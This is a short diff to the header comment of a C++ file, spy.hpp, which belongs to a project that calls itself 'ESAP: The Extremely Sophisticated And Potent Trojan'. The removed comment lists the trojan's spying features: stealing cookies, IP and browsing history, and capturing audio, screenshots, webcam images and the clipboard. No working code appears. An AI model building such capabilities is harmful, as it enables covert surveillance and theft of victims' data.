@@ -1,12 +1,13 @@
 /*
-SPY:
-grab cookies: return whatever
-grab publicip: return string [ok]
-grab history: return whatever (check jabor)
-record audio
-screenshot: return base64 [ok]
-webcam image: return base64, unless above, or whatever CV returns [ok]
-clipboard: return string [ok]
+ ___ ___   _   ___ 
+| __/ __| /_\ | _ \
+| _|\__ \/ _ \|  _/
+|___|___/_/ \_\_|  
+
+ESAP: The Extremely Sophisticated And Potent Trojan
+<spy.hpp>
+This header contains functions under the spy category.
+
 */
 
 #include <iostream>
